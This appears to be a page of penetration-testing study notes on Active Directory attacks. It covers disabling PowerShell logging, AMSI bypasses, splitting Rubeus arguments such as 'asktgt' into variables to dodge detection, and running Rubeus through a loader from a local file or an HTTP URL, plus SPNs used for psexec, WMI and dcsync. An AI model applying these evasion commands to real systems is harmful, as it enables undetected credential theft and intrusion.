## PowerShell Scripts
>Use  [InviShell](02%20-%20Notes.md#Bypassing%20PowerShell%20Logging) to disable PowerShell logging, has a built-in AMSI bypass.
>
> Alternitavely use an [AMSI bypass](02%20-%20Notes.md#Bypass%20AMSI%20and%20ETW).
> 
> If static detection is a problem, try obfuscating the tool.
---
## Binaries
https://raw.githubusercontent.com/Raptoratack/ADTools/refs/heads/main/ArgSplit.bat
https://github.com/Raptoratack/ADTools/blob/main/Loader.exe
>  Use ArgSplit to obfuscate the command argument, e.g: kerberoast, asktgt, etc...
> Copy and paste all the `set` :
>```cmd
>[!] Argument Limit: 180 characters
>[+] Enter a string: asktgt
>set "z=t"
>set "y=g"
>set "x=t"
>set "w=k"
>set "v=s"
>set "u=a"
>set "Pwn=%u%%v%%w%%x%%y%%z%"
> ```
> Check that the `%Pwn%` variable is what the want.
> 
>Use Loader.exe to load our binaries (Rubeus example):
>```cmd
>Loader.exe -Path Rubeus.exe -args %Pwn% /stats /rc4opsec
>```
>Use Loader.exe with the [behaviour detection bypass](03%20-%20File%20Transfer.md#Bypass%20behaviour%20detection%20when%20downloading%20a%20file):
>```cmd
>Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /stats /rc4opsec
>```
---
## SPN
>**ℹ️ Info:**
> Different SPN and what they're used for:
>- CIFS for directory browsing, copying files.
>- HTTP for WinRS.
>- HOST and CIFS for psexec.
>- HOST and RPCSS for WMI.
>- HOST and HTTP for PowerShell Remoting/WINRM.
>- LDAP for dcsync.